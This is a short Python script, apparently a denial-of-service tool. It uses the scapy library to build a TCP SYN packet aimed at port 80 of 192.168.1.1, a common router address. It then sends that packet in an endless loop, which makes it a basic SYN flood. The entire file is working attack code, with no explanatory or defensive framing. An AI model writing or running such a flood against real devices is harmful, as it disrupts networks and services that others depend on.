import scapy.all as scapy


def build_packet(ip, port):
    ip_layer = scapy.IP(dst=ip)
    tcp_layer = scapy.TCP(dport=port, flags="S", seq=1000)
    packet = ip_layer/tcp_layer
    return packet


def main():
    router_ip = "192.168.1.1"
    port = 80
    packet = build_packet(router_ip, port)
    while(True):
        scapy.send(packet)

if __name__ == "__main__":
    main()

























